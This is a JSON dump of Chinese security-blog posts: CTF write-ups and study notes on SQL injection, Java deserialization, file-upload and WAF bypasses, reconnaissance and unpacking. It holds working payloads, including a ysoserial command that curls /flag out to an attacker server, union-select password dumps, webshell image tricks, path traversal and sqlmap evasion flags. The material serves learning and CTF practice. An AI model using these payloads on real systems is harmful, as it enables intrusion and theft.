[{"title":"博客迁移","path":"/2024/12/03/博客迁移/","content":"博客迁移","categories":["笔记"]},{"title":"think_java","path":"/2024/04/30/think-java/","content":"# sql 注入获取用户密码 首先打开 class 代码，在 test 中发现，在 /common/test/sqlDict 目录下有注入漏洞，同时也可以看到它调用了 swagger 模块 sqlDict 代码 抓一下包，以 post 形式注入，注意下注入点的路径 1dbName=myapp?a=&#x27;union+select+group_concat(name)from(user)# 1dbName=myapp?a=&#x27;union+select+group_concat(pwd)from(user)# 获取到了用户名以及密码 admin/admin@Rrrr_ctf_asde # swagger 模块 什么是 swagger 模块：swagger-ui 提供了一个可视化的 UI 页面展示描述文件。接口的调用方、测试、项目经理等都可以在该页面中对相关接口进行查阅和做一些简单的接口请求。该项目支持在线导入描述文件和本地部署 UI 项目。 接口查看地址可以通过服务地址 /swagger-ui.html 访问 这里有三个部分，分别是获取当前用户信息，登录，以及数据库字典查询，刚才得到了数据库用户的信息。 # Java 反序列化 这里尝试登录 登录之后返回的数据是明显的 java 序列化后的值 java 序列化的特征： 一段数据以 rO0AB 开头，基本可以确定是 java 序列 base64 编码的数据 一段数据以 aced 开头，那么他就是这段 java 序列化的 16 进制 1Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu 这是 base64 编码后的序列化值，我们可以通过一个工具来看它在序列化之前是什么样的，我们要用到 SerializationDumper 这个工具，它在使用时需要用到 16 进制的序列化值，可以在网上先用 base64 转 16 进制工具转换一下，也可以用 python 脚本 1aced000573720018636e2e6162632e636f72652e6d6f64656c2e55736572566f764643317b04f43a0200024c000269647400104c6a6176612f6c616e672f4c6f6e673b4c00046e616d657400124c6a6176612f6c616e672f537472696e673b78707372000e6a6176612e6c616e672e4c6f6e673b8be490cc8f23df0200014a000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000000000000174000561646d696e SerializationDumper 使用命令：java -jar SerializationDumper.jar + 16 进制序列化 # java Deserialization Scanner java Deserialization Scanner 是一个 bp 的工具，可以扫描目标能用哪种方式进行反序列化攻击，可以直接在 bp 的插件商店里面安装，安装完之后要配置一下环境变量，写入 java 的路径以及等会要用到的工具 ysoserial 的路径 然后抓包发送到插件中，注意抓的包是反序列化注入点的包，也就是 &quot;获取当前用户信息&quot; 页面发送验证的请求包 选中序列化部分添加变量作为攻击点，选择 base64 编码的方式，然后 attack，攻击完之后可以看到 rome 模式是一个可攻击的点，所以在接下来用到 ysoserial 的时候，我们就用它的 rome 模块来创造 payload # ysoserial ysoserial 是一个集合了各种 java 反序列化 payload 的工具，这里我们用 rome 模块 使用命令如下，url 为公网服务器的地址 1java -jar ysoserial.jar ROME &quot;curl http://xxx.xxx.xxx.xxx:6150 -d @/flag&quot; &gt; tch.bin 这里会生成一个 payload 为 tch.bin，但是我们反序列化的注入点是需要 base64 格式的，我们直接拿生成的文件去一个在线文件转 base64 的网站转换一下就可以 复制下来，替换掉请求包序列化的内容 或者直接在 &quot;获取当前用户信息&quot; 页面中传入也是可以的 在公网服务器上监听端口（提前打开），然后获取到数据包，getflag","tags":["反序列化"],"categories":["wp"]},{"title":"uploadlabs笔记","path":"/2024/04/07/uploadlabs笔记/","content":"# 第 14 关 - 图片马 第 14 关的要求是上传图片马，也就是用图片加一段 php 代码，在网站有这个包含漏洞的情况下才可以解析这个木马 首先要制作一个图片马，可以直接用文本文档格式编辑，在图片后面加一段 php 代码，但是需要 16 进制编写。还可以用 cmd 生成，语句如下 1copy a.png /b + a.php /a webshell.png 在这个生成文件上传成功之后检测一下是否能成功运行，题目已经给了文件包含漏洞访问 找到文件上传之后的所在路径和文件名，用 bp 抓包看一下 然后在文件包含漏洞页面访问 # 第 15 关 - getimagesize () 这关和上一关只有一个区别，是一个 getimagesize 函数，这个函数会读取文件的 16 进制头，看是不是符合正常的图片的文件头，看看源码 1234567891011121314function isImage($filename)&#123; $types = &#x27;.jpeg|.png|.gif&#x27;; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125; 所以只要文件头符合上述三个文件类型即可，其他步骤和 14 关一致 # 第 16 关 - exif_imagetype () 16 关和 14、15 关的思路依旧是一样的，但是这里的区别是 exif_imagetype，其功能是检测 16 进制文件头并检测其后缀名，功能和 getimagesize 一样，但是速度比其要快得多，在 php 扩展中可以打开这个功能 # 第 17 关 - 二次渲染 现在很多网站都会对用户上传的图片进行再次压缩、裁剪等渲染操作，比如 php 中的 imagecreatefromjpeg ()，所以普通的图片马基本上都会被渲染掉 # 绕过 GIF：在渲染前后的两张 GIF 不一样的数据块部分插入 webshell PNG：要将数据写入到 PLTE 数据块或者 IDAT 数据块 JPG：需要用脚本将数据插入到特定的数据块，而且可能不会成功，要多次尝试","tags":["文件上传"],"categories":["笔记"]},{"title":"文件上传漏洞","path":"/2024/04/05/文件上传漏洞/","content":"# 漏洞类型 # 常规类 扫描获取上传；会员中心上传；后台系统上传；各种途径 # 解析漏洞 apache；IIS6/7.X；nginx。IIS/7.X 和 nginx 是几乎一样的 # Apache 未知扩展名解析漏洞；AddHandler 导致的解析漏洞；HTTPD 换行解析漏洞 # 未知扩展名解析漏洞 apache 的解析漏洞依赖于一个特性，apache 默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别（不在 mime.types 文件内），则继续向左识别，直到识别到合法后缀才进行解析 x.php.xxx.yyy 识别最后的 yyy，如果不识别，就向前解析，直到识别 利用场景： 如果对方中间件 apache 属于低版本，我们可以利用这个文件上传上传一个不识别的文件后缀，利用解析漏洞规则成功解析文件，其中后门代码被触发 实战中可以上传 rar，owf 等文件进行利用，如果上传 phpinfo.php.jpg，即使文件名中有.php 也会直接解析为.jpg，因为 apache 认识.jpg，停止继续向左识别 # Nginx Nginx 配置文件错误导致的解析漏洞；Nginx 字节任意代码执行漏洞；等等 # Nginx 配置文件错误导致的解析漏洞 对于任意文件名，在后面添加 /xxx.php（xxx 为任意字符）后，即可将文件作为 php 解析。 例：info.jpg 后面加上 /xxx.php，会将 info.jpg 以 php 解析。 # CMS 漏洞 已知 cms 源码 # 编辑器漏洞 fckeditor；ckeditor；kindeditor # CVE 漏洞 CVE-2019-12615；CVE-2015-5254 # 验证 / 绕过 # 前端 js 类防护，前端验证代码可以直接删除 # 后端 # 黑名单 大小写绕过；点绕过；空格绕过；配合解析漏洞绕过；双后缀名绕过 # 特殊解析后缀 php3,php5 也可以解析为 php 同时不被拦截 # .htaccess 解析 .htaccess 文件中，用 filematch 函数进行对文件名的匹配 123&lt;FilesMatch &quot;\\.jpg&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 这段代码的意思是，如果上传的文件名中有.jpg 这串字符，就以 php 文件来执行这个文件，由于网站没有对.htaccess 文件进行过滤，所以可以通过上传.htaccess 文件来对后续上传的文件进行一个绕过 # ::$DATA 绕过 在 window 的时候如果文件名加::$DATA 会把::$DATA 之后的数据当成文件流处理，不会检测后缀名，且保持::$DATA 之前的文件名，他的目的就是不检查后缀名 例如:“phpinfo.php::$DATA&quot;Windows 会自动去掉末尾的::$DATA 变成&quot;phpinfo.php” # 循环过滤 有的验证代码只会验证一次，而不会循环验证 比如将 php 替换为空，在只有一次循环的情况下，‘a.php’会被替换为’a.’ ‘a.pphphp’就会被替换为’a.php’ 而多次循环不会出现这种情况 # 白名单 # MIME 绕过 修改文件类型 # %00 截断 我们上传 1.php%00.jpg 时，首先后缀名是合法的 jpg 格式，可以绕过前端的检测。上传到后端后，后端判断文件名后缀的函数会认为其是一个.jpg 格式的文件，可以躲过白名单检测。但是在保存文件时，保存文件时处理文件名的函数在遇到 %00 字符认为这是终止符，于是丢弃后面的.jpg，于是我们上传的 1.php%00.jpg 文件最终会被写入 1.php 文件中并存储在服务端 条件： php&lt;5.3.4 文件上传路径可控 …/upload/phpinfo.php%00/8220201011144424.jpg 实际上传的为 phpinfo.php 而不是.jpg 如果是以 post 形式上传要将 %00 url 解码一下，get 会自动解码 post 不会 # 其他 # 二次渲染下的条件竞争 由于有些网站的二次渲染，文件在上传之后会首先直接上传到缓存当中，然后再重新对文件进行验证，如果文件有害就删除，无害则进行二次渲染。 而在计算机中，最小的运算调度单位是线程，而每个线程又依附于一个进程，条件竞争则是多进程或多线程对一个共享资源操作，因为操作顺序不受控的时候所产生的问题。比如当我们在打开一个文档的时候，我们要对其进行删除操作，系统会提示当前程序正在运行无法删除 那么我们可以利用这一点，进行恶意文件的上传 我们可以利用 bp 的爆破工具不断上传一个文件，同时我们又不断发送访问这个文件的请求，如果这个文件被我们访问成功了，那么后台就无法删除这个文件，实现木马的上传 文件头检测 突破 getimagesize # 路径重命名 当上传文件的时，有的系统会自动重命名这个文件，然后保存在对应的路径下 UPLOAD_PATH . ‘/’ .$file_name; 那么我们可以这样写 upload/upload-19.php/. 代码在验证的时候验证的是 upload-19.php/. 而不是 upload-19.php，这样就绕过了对 php 的验证，而保存的时候还是只会保存 php 文件 # WAF 绕过 # 数据溢出 - 防匹配（xxx…） 在数据包填入大量无关数据导致 waf 功能失效 # 符号变异 - 防匹配（’ &quot; ;） 比如文件名为 &quot;a.php&quot;，可以把双引号去掉一个，写成 &quot;a.php，不要后面的双引号；或者直接去掉双引号；或者可以写成&quot;a&quot;.php;&quot;a&quot;a.php # 数据截断 - 防匹配（%00; 换行） “a.php&quot;写成&quot;a.php%00.jpg” or “a.php::$DATA.jpg” or “a.php;.jpg” or “a.jpg;.php” 这些不一定都能绕过，但也有可能绕过，具体情况具体分析判断 换行就是写成 “a . p h p” # 重复数据 - 防匹配（参数多次） 在 filename=&quot;a.php&quot; 之前，填入大量的其他 filename，比如 filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“a.php”; 或者将数据包整个一段填入 filename 中 将 Content-Disposition: form-data; name=“upload_file” filename=“x.php” Content-Type: image/jpeg 写成 Content-Disposition: form-data; name=“upload_file” filename=&quot;Content-Disposition: form-data; name=“upload_file&quot;x.php” Content-Type: image/jpeg 就是将 filename 之前的一段当作 filename 的值填入进去，类似于递归，数据包层面上看表面上是给了值，但实际上没有真正的值，但安全狗会认为已经有值填入了 或者还可以这样写 将 Content-Disposition: form-data; name=“upload_file” filename=“x.php” Content-Type: image/jpeg 写成 Content-Disposition: form-data; name=“upload_file” filename=“Content-Type: image/jpeg;x.php” Content-Type: image/jpeg 这里要注意，a.php 前要加分号，安全狗会认为到分号就结尾了，斜杠也可以起到类似于分号的作用，也就是说这里也可以写成 filename=“Content-Type: image/jpeg/x.php” 或者 filename=“Content-Type: image/jpegx/.php” # Fuzz 用 bp 导入 fuzz 字典进行爆破，但是因为速度太快可能会被拦截。也可以自己写字典然后倒入到里面去尝试，重要的是思路 # 安全修复 后端验证：采用服务端验证模式 后缀检测：基于黑名单，白名单过滤 MIMEM 检测：基于上传自带类型检测 内容检测： 文件头，完整性检测 自带函数过滤：参考 uploadlabs 函数 自定义函数过滤：function check_file () WAF 防护产品：宝塔，云盾，安全公司产品等","tags":["文件上传"],"categories":["笔记"]},{"title":"信息收集","path":"/2024/03/28/信息收集/","content":"# 有无 web 网站 通过多地 ping 工具判断有无 CDN，不同的情况根据不同的方法进行信息收集 # 有 CDN # 国外请求 从国外对内地 ping，因为如果不是有海外业务的公司一般是不会设置海外的 CDN 的，所以从海外 ping 它的网站可以直接连接到主服务器 https://tools.ipip.net/ping.php # 接口查询 查询网站的不同接口，每个接口对应着不同的功能，可以通过黑暗引擎搜集接口，找到目标的后台管理平台 # 黑暗引擎 https://fofa.info/ https://www.zoomeye.org/ https://www.shodan.io/ https://x.threatbook.com/ 等等 # 子域名 子域名可以通过 layer 等或者在线工具查询， 有的网站主域名会做 CDN，但是子域名可能不会做 二级域名和三级域名查到的结果可能不一样 主域名和子域名查询到的可能不一样 DNs 历史记录 = 第三方接口 (接口查询) 采集 / 国外请求 (同类型访问) 邮件源码测试对比第三方查询 (地区分析) 黑暗引擎 (shodan 搜指定 hash 文件) 扫全网 fuckcdn，w8 fuckcdn，zmap 等 工具扫描 认为判定，根据网站的域名备案推测 本地清下 dns，然后 hosts 里写上得到的 ip 和域名，如果是 cdn 可能会出现刷新异常，如果打开很快大概率是原机 # 其他 邮件服务查询：我们访问别人，可能通过 CND，但别人访问我们通常不会走 CDN 遗留文件，扫描全网 黑暗引擎搜索特定文件 dns 历史记录，以量打量：CDN 节点是有流量上限的，用光之后就会直通原机，这也是一种流量攻击 # 无 CDN # 程序源码 # 中间件 nignx，apache 等中间件漏洞 # 内部 / 位置 cms # 开源 cms wordpress，Z-Blog 等 cms 漏洞 # 站点搭建 # 目录站点 敏感文件 robots.txt、crossdomin.xml、sitemap.xml、源码泄漏文件 # 端口站点 端口扫描工具，nmap，masscan # 子域名站点 子域名扫描工具，oneforall，layer，teemo，nslookup 等 # 旁注 / C 类站点 旁站：是和目标网站在同一台服务器上的其它的网站，通过入侵安全性较差的旁站，之后可以通过提权跨目录等手段拿到目标服务器的权限。 工具：K8_C 段旁注工具、WebRobot、御剑、明小子 … C 段：每个 IP 有 ABCD 四个段，也就是说是 D 段 1-255 中的一台服务器，然后利用工具嗅探拿下该服务。比如 192.168.3.0-255 的设备都处于同一个 c 段 目标 ip 为 192.168.1.128，可以入侵 192.168.1.* 的任意一台机器，然后利用一些黑客工具嗅探获取在网络上传输的各种信息。 工具：Cain、Sniffit 、Snoop、Tcpdump、Dsniff … # 类域名站点 一个站点可以用多个域名 # 防护应用 WAF 安全狗，宝塔，云盾，安骑士 # 其他 # 有无 APP # 涉及 web # 不涉及 web # 尝试提取 抓包获取信息 # 逆向工程反编译 反编译查找源码漏洞，难度极大 # 无 web # 有无其他 # 资产信息 # 各种平台查询 # whois 备案 根据已知域名反差，分析出此域名的注册人，邮箱，电话等 工具：爱站网、站长工具、微步在线（https://x.threatbook.cn）、site.ip138.com、searchdns.netcraft.com、国外 whois 信息查询网址：https://who.is # github 监控 # 第三方应用 # 数据库应用 # 各种监管平台 # 第三方应用 # 服务接口 支付接口 储存服务 内部服务 # 微信公众号 涉及 web 涉及 app 其他 # 内部群 qq / 微信群 钉钉 / 工作群 其他","tags":["sql注入"],"categories":["笔记"]},{"title":"sql注入","path":"/2024/03/28/sql注入/","content":"# 基本语句 备忘 1234567891011table_schema:库名table_name:表名column_name:列名union select 1,2,3,4union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#x27;database()&#x27;union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;tablename&#x27;union select 1,name,password,4 from database() # 函数 # 截取函数 12345left（‘admin’,1）:左截取，从左边截取admin字符串，截取一位。right（&#x27;admin&#x27;,1）：右截取mid（&#x27;admin&#x27;,1,2）：截取admin字符串，从第一位开始截取，截取两位substr（&#x27;str&#x27;,pos）：截取从pos位置开始到最后的所有str字符串substring（&#x27;str&#x27;,pos,len）： str 为列名 / 字符串 pos 为起始位置；mysql 中的起始位置 pos 是从 1 开始的；如果为正数，就表示从正数的位置往下截取字符串（起始坐标从 1 开始），反之如果起始位置 pos 为负数，那么 表示就从倒数第几个开始截取 len 为截取字符个数 / 长度。 # 判断函数 12if（1=1，1，0）:case when 1=1 then 0 else 1 end: # 报错函数 123updatexml(1,concat(0x7e,注入语句,0x7e),1)=1id=1&#x27;and updatexml(1,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),31,32),0x7e),1)=&#x27;1 # 提交方式 get，post，cookie，request，http 头等 # 数据类型 数字型，字符型，搜索型 # 查询方法 select，insert，delete，update，order by # 回显、盲注 回显注入，无回显注入，延时注入，布尔注入 # 数据库类型 不同的数据库注入语法略有不同 # 扩展 加解密注入，json 注入，ladp 注入，dnslog 注入，二次注入，堆叠查询，文件读写 # JSON 注入 JSON 是独特的储存数据形式 12345curl -X POST https://api.zoomeye.org/user/login -d&#123; &quot;username&quot;: &quot;foo@bar.com&quot;, &quot;password&quot;: &quot;foobar&quot;&#125; 注入点就可以在 foobar 后面 1&quot;username&quot;: &quot;foo@bar.com&#x27; and 1=1#&quot;","tags":["sql注入"],"categories":["笔记"]},{"title":"sql注入之waf绕过","path":"/2024/03/27/sql注入之waf绕过/","content":"# sqlmap 绕过 waf # 流量拦截 因为 sqlmap 的扫描速度很快，可能会被网站的流量监控给拦截，我们可以用时间函数或者代理池解决 # 时间函数 1python sqlmap.py -u &quot;url&quot; --delay 1 # 代理池 # 请求头拦截 sqlmap 在注入时，请求头被检测到就会被屏蔽，我们可以用随机 user-agent 或者搜索引擎的请求头 1python sqlmap.py -u &quot;url&quot; --random-agent 可以自定义请求头比如用百度的请求头，因为搜索引擎收录站点也是用爬虫爬取的，所以一般的网站不会屏蔽搜索引擎的请求头 1python sqlmap.py -u &quot;url&quot; --user-agent=&quot;Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)&quot; 扩展 1：有些 WAF 它拦截的可能是其他字段，可以使用 burp 抓包替换这个字段来进行绕过 扩展 2：将注入语句写在 txt 文件中，放在 sqlmap 目录下跑 # 关键字替换 通过 tamper 模块的绕过脚本，将容易被屏蔽的关键字替换，sqlmap 自带很多脚本在 sqlmap/tamper 目录下 1python sqlmap.py -u &quot;url&quot; --tamper 模块名，模块名... # IP 白名单 当网站获取 ip 的方式为获取客户端的 ip 的话，就有可能存在伪造 i 绕过的情况，但从网络层获取 ip 的就没这个可能 方法：修改 http 的 header 12345x-forwarded-forx-remote-IPx-originating-IPx-remote-addrx-Real-ip # 静态资源 特定的静态资源后缀请求，常见的静态文件 (.js .jpg .swf .css 等等)，类似白名单机制，waf 为了检测效率，不去检测这样一些静态文件名后缀的请求。 12http://10.9.9.201/ sql.php?id=1http://10.9.9.201/sql.php/1.js?id=1 备注: Aspx/php 只识别到前面的，.aspx/.php 后面基本不识别 # url 白名单 为了防止误拦，部分 waf 内置默认的白名单列表，如 admin/manager/system 等管理后台。只要 url 中存在白名单的字符串，就作为白名单不进行检测。常见的 url 构造姿势: 123http://10.9.9.201/sql.php/admin.php?id=1http://10.9.9.201/sql.php?a=/manage/&amp;b=../etc/passwdhttp://10.9.9.201/../../../ manage/../sql.asp?id=2 waf 通过 /manage/ 进行比较，只要 url 中存在 /manage/ 就作为白名单不进行检测，这样我们可以通过 /sql.php?a=/manage/&amp;b=…/etc/passwd 绕过防御规则 # 爬虫白名单 通过伪造各大搜索引擎的请求头来绕过 waf 部分 waf 有提供爬虫白名单（各大浏览器的爬虫）的功能，识别爬虫的技术一般有两种: 1、根据 useragent 2、通过行为来判断 UserAgent 可以很容易欺骗，我们可以伪装成爬虫尝试绕过。User Agent switcher (Firefox 附加组件)，下载地址: https://addons.mozilla.org/en-us/firefox/addon/user-agent-switcher/ # 数据替换 大小写，加解密，编码，等价函数，特殊符号，反序列化，注释符混用 # 其他 # Fuzz # 垃圾数据溢出 # http 参数污染 如果出现多个相同参数，不同的服务器搭建网站会出现参数接受的差别，从而令原有的参数失效 web 服务器 参数获取函数 获取到的参数 PHP/Apache $_GET(“par”) last JSP/Tomcat Request.getParameter(“par”) first Perl(CGI)/Apache Param(“par”) first Python/Apache Getvalue(“par”) all(list) ASP/IIS Request.QueryString(“par”) all # 数据库特性","tags":["sql注入"],"categories":["笔记"]},{"title":"ESP定律——脱壳","path":"/2022/09/01/ESP定律——脱壳/","content":"# OEP OEP 是程序的入口点，软件加了壳就是隐藏了 OEP 或是用了假的 OEP，以达到保护程序的目的，只要我们可以找到程序的真正的 OEP 就可以脱壳，pushad（压栈）是代表程序的入口点，popad（出栈）代表程序的出口点，与 pushad 相对应，找到 popad，oep 一般就在这附近 # ESP 定律步骤 1、首先 F8（一般刚进去的时候会在 pushad 附近），然后观察右上角寄存器中 ESP 有没有突变成红色，如果变成红色就进行接下来的步骤 2、在底下的命令行输入指令 dd XXXXXXX 或 hr XXXXXXX (即当前 ESP 的地址)，然后回车（也可以直接右键跟随） 3、选中刚刚下断点的地址，右键选择断点 ——&gt; 硬件访问 ——&gt;word 断点，英文 breakpoint——&gt;hardware,on access——&gt;word 4、F9 运行到跳转出，F8 到达程序 OEP 5、用自带插件 olly dump 保存文件 # 注意事项 我在用 esp 定律脱壳的时候，第一次用 OD 是可以正常脱壳的，但后面不知道为什么，一直会弹出一个 “无法读取被调用程序的内存” 的提示，无法脱壳，然后我在网上找了很多方法，也有很多我还不理解的，但有一个比较方便的方法是可以用的，就是用虚拟机，用 windows xp 的虚拟机运行 OD 就可以正常脱壳了，不过在本机上为什么不能脱壳，我还不知道是什么原因，欢迎大佬指点 # 其他脱壳方法 ESP 定律脱壳只是手动脱壳其中一个方法，想更深层次理解 ESP 定律或学习其他方法可以看这个博客：ESP 定理如何判断找出 OEP 【OEP 脱壳的 5 种方法】","tags":["reverse"],"categories":["笔记"]},{"title":"NepCTF2022","path":"/2022/08/11/NepCTF2022/","content":"# Reverse # 快来签到 打开 ida 之后报错，提示 The graph is too big，我们在 general 里面把 Max number of nodes 改成 999999 就就可以看到了 NepCTF{welc0me_t0_nepctf} # We_can_go 直接看关键函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960int sub_719630()&#123; int i; // edx int result; // eax _DWORD *v2; // [esp+4h] [ebp-60h] _BYTE *v3; // [esp+Ch] [ebp-58h] int v4; // [esp+10h] [ebp-54h] char v5[32]; // [esp+20h] [ebp-44h] BYREF _DWORD *v6; // [esp+40h] [ebp-24h] int v7[2]; // [esp+44h] [ebp-20h] BYREF int v8[2]; // [esp+4Ch] [ebp-18h] BYREF int v9[2]; // [esp+54h] [ebp-10h] BYREF int v10[2]; // [esp+5Ch] [ebp-8h] BYREF void *retaddr; // [esp+64h] [ebp+0h] BYREF if ( &amp;retaddr &lt;= *(*NtCurrentTeb()-&gt;NtTib.ArbitraryUserPointer + 8) ) sub_6D82C0(); sub_68AC70(&amp;unk_7233C0); v6 = v2; v2[1] = 0; *v2 = 0; v10[0] = &amp;unk_7200A0; v10[1] = v2; sub_713D80(&amp;off_7525B8, dword_7CB200, v10, 1, 1); sub_6C79B0(v5, *v6, v6[1]); if ( v4 == &#x27;\\x17&#x27; &amp;&amp; *v3 == &#x27;N&#x27; &amp;&amp; v3[1] == &#x27;e&#x27; &amp;&amp; v3[2] == &#x27;p&#x27; &amp;&amp; v3[3] == &#x27;C&#x27; &amp;&amp; v3[4] == &#x27;T&#x27; &amp;&amp; v3[5] == &#x27;F&#x27; &amp;&amp; v3[6] == &#x27;&#123;&#x27; &amp;&amp; v3[22] == &#x27;&#125;&#x27; ) &#123; for ( i = 0; i &lt; 15; ++i ) &#123; if ( i &gt;= dword_7CB6E4 ) sub_6D9750(); if ( i + 7 &gt;= &#x27;\\x17&#x27; ) sub_6D9750(); if ( v3[i + 7] != *(dword_7CB6E0 + i) ) &#123; v8[0] = &amp;unk_7233C0; v8[1] = &amp;off_752334; return sub_70D8C0(&amp;off_7525CC, dword_7CB204, v8, 1, 1); &#125; &#125; v7[0] = &amp;unk_7233C0; v7[1] = &amp;off_75233C; result = sub_70D8C0(&amp;off_7525CC, dword_7CB204, v7, 1, 1); &#125; else &#123; v9[0] = &amp;unk_7233C0; v9[1] = &amp;off_752334; result = sub_70D8C0(&amp;off_7525CC, dword_7CB204, v9, 1, 1); &#125; return result;&#125; 42 行的判断是关键语句，dword_7CB6E0 就是我们需要的数据，在这里下一个断点，动调一下就可以看到 NepCTF{U9eT_t0_th3TRUE}","tags":["reverse"],"categories":["wp"]},{"title":"如何脱bang壳","path":"/2022/08/07/如何脱bang壳/","content":"今天遇到一个加了壳的安卓题，[网鼎杯 2020 青龙组] bang，这是我第一次遇见加壳的 apk 程序，加了 bang 这个壳，第一次去这种壳所以记录一下，以免以后忘记 这里首先使用 PKID 这个工具来查壳，在网上可以搜到，然后就可以看到 然后就要用到 frida-dexdeump 脚本来脱壳，在使用这个脚本之前，还要在连接安卓系统的条件下使用，在这里还要配置一下 frida 的环境 # 第一步，在 windows 下安装 frida 模块和 frida-tools 模块 先安装 frida 模块 1pip install frida 然后安装 frida-tools 模块 1pip install frida-tools 在安装完之后，要将他们所在的路径添加到环境变量中，否则无法使用 frida 指令 # 第二步，安卓系统下安装 frida-server 要与安卓系统进行连接，首先要在安卓系统中安装 frida-server，可以看到这里有很多版本 我们要选择与我们刚才在 windows 下 pip 安装的 frida 相对应的版本进行安装，同时还要看你所使用的安卓系统的架构，比如我安装的 frida 是 15.2.2 版本的，而且我用的安卓系统是 64 位的，那我就选择 frida-server-15.2.2-android-x86_64.xz，然后我们就要把它安装进安卓系统中 # 连接安卓系统 连接安卓系统需要用到 adb 指令，下载解压之后将其路径添加到环境变量中就可以使用了，然后打开 cmd，输入下面的命令进行传输 1adb push (frida-server在windows中的路径) /data/local/tmp(这个是安卓系统的目标路径) 输入完之后可能要等个一两分钟才传输完成，完成之后就可以进行连接了，我用的安卓系统是 mumu 模拟器的，可以在模拟器里面看自己的地址，输入以下命令连接 1adb connect 127.0.0.1:7555 连接成功 然后通过以下命令进入 frida-server 所在目录 123adb shellsucd /data/local/tmp 先给文件权限 1chmod 777 frida-server-15.2.2(文件名) 再打开 1./frida-server-15.2.2 然后我们再打开一个新的 cmd 输入 1frida-ps -U 以此来确认该程序有没有打开成功 这就说明打开成功了 # 第三步，脚本脱壳 在安卓端打开 frida-server 之后，我们再在安卓端把要脱壳的程序给打开，就可以在 windows 下进行脱壳了，我们在刚刚下好的 frida-dexdump 目录下打开 cmd，输入下面的命令 1frida-dexdump -FU 然后在此目录下会出现一个跟被脱壳程序同名的文件，里面有两个 把第一个文件拿到 jeb 中打开，可以直接看到 flag 得到 flag {borring_things}","tags":["reverse"],"categories":["笔记"]},{"title":"DASCTF2022-7月-隐秘的角落","path":"/2022/07/31/DASCTF2022-7月-隐藏的角落/","content":"# 主函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354void __cdecl main_main()&#123; __int64 v0; // rdx int v1; // edi __int64 v2; // rsi int v3; // edx int v4; // ecx __int64 v5; // r8 __int64 v6; // r9 __int64 v7; // r8 __int64 v8; // r9 __int64 v9; // r8 __int64 v10; // r9 int v11; // er8 int v12; // er9 int v13; // edx __int64 v14; // r8 __int64 v15; // r9 int v16; // edx int v17; // ecx __int64 v18; // r8 __int128 v19; // [rsp+58h] [rbp-38h] BYREF __int128 v20; // [rsp+68h] [rbp-28h] BYREF void *v21; // [rsp+78h] [rbp-18h] BYREF void **v22; // [rsp+80h] [rbp-10h] BYREF if ( &amp;v22 &lt;= *(__readfsqword(0xFFFFFFF8) + 16) ) runtime_morestack_noctxt(); sync___WaitGroup__Add(v1, v2, v0); runtime_newobject(v1, v2, v3, v4, v5, v6); v21 = &amp;unk_4B0DA0; v22 = &amp;off_4E9BB0; fmt_Fprintln(v1, v2, &amp;v21, &amp;unk_4B0DA0, v7, v8, &amp;go_itab__os_File_io_Writer, os_Stdout, &amp;v21); *&amp;v20 = &amp;unk_4AE9C0; *(&amp;v20 + 1) = 1LL; fmt_Fscanf( v1, v2, &amp;go_itab__os_File_io_Reader, &amp;v20, v9, v10, &amp;go_itab__os_File_io_Reader, os_Stdin, &amp;unk_4C9DA5, 2LL, &amp;v20, 1LL); runtime_newproc(v1, v2, &amp;off_4D2310, MEMORY[1], v11, v12, 16, &amp;off_4D2310, MEMORY[1], MEMORY[9]); *&amp;v19 = &amp;unk_4B0DA0; *(&amp;v19 + 1) = &amp;off_4E9BC0; fmt_Fprintln(v1, v2, v13, &amp;go_itab__os_File_io_Writer, v14, v15, &amp;go_itab__os_File_io_Writer, os_Stdout, &amp;v19); sync___WaitGroup__Wait(v1, v2, v16, v17, v18);&#125; 其中 runtime_newproc 函数代表启动了另一个线程来执行函数，交叉引用可以发现引用的是 main_checkflag 函数，后面的数组比如 &amp; off_4E9BC0 就是提示语，在 linux 中打开之后输入 flag 会提示’Who am I? where am I? what am I doing?’，不过我们先不用管这个，先看关键函数 # main_checkflag 123456789101112131415161718192021222324252627282930313233343536373839404142434445__int64 __fastcall main_checkflag(int a1, __int64 a2, int a3, __int64 a4, int a5, int a6, __int64 a7, __int64 a8)&#123; unsigned __int64 v8; // rcx __int64 v9; // r8 __int64 v10; // r9 int v11; // edx char v12; // al __int64 v13; // rdx int v15; // [rsp+18h] [rbp-70h] __int64 v16; // [rsp+20h] [rbp-68h] int v17; // [rsp+28h] [rbp-60h] char v18[32]; // [rsp+40h] [rbp-48h] BYREF __int128 v19; // [rsp+60h] [rbp-28h] BYREF __int128 v20; // [rsp+70h] [rbp-18h] BYREF __int64 v21; // [rsp+80h] [rbp-8h] BYREF v8 = __readfsqword(0xFFFFFFF8); if ( &amp;v21 &lt;= *(v8 + 16) ) runtime_morestack_noctxt(); 